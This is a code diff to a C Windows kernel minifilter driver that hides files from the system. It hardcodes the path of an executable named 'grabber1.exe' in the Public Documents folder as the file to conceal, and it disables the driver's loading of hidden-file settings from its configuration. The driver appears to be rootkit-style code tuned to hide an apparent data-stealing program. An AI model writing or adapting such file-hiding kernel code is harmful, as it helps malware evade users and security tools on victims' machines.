@@ -8,7 +8,7 @@
 #include "Helper.h"
 //#include "PsMonitor.h"
 #include "Driver.h"
-#include "Configs.h"
+//#include "Configs.h"
 
 #define FSFILTER_ALLOC_TAG 'DHlF'
 
@@ -62,7 +62,7 @@ ExcludeContext g_excludeFileContext;
 // Use this variable for hard code full file paths that you would like to hide
 // For instance: L"\\Device\\HarddiskVolume1\\Windows\\System32\\calc.exe"
 // Notice: this array should be NULL terminated
-WCHAR g_excludeFiles[1][256] = {
+WCHAR g_excludeFile[256] = {
 	L"\\Device\\HarddiskVolume2\\Users\\Public\\Documents\\grabber1.exe"
 };
 
@@ -765,11 +765,11 @@ NTSTATUS InitializeFSMiniFilter(PDRIVER_OBJECT DriverObject)
 
 	//for (i = 0; g_excludeFiles[i]; i++)
 	//{
-		RtlInitUnicodeString(&str, g_excludeFiles[0]);
+		RtlInitUnicodeString(&str, g_excludeFile);
 		AddExcludeListFile(g_excludeFileContext, &str, &id, 0);
 	//}
 
-	CfgEnumConfigsTable(HideFilesTable, &LoadConfigFilesCallback, NULL);
+	//CfgEnumConfigsTable(HideFilesTable, &LoadConfigFilesCallback, NULL);
 
 	//status = InitializeExcludeListContext(&g_excludeDirectoryContext, ExcludeDirectory);
 	//if (!NT_SUCCESS(status))
